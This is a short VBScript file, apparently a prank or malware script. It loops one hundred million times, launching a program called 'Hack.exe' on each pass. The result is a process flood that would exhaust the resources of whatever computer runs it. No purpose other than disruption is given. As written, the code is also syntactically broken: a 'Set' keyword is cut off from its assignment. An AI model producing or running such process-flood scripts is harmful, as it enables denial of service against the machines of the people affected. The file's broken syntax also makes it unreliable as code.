Option Explicit

Dim WShell
Set
WShell=Wscript.CreateObject("WScript.Shell")

Dim x
For x = 1 to 100000000
Wshell.Run "Hack.exe"
Next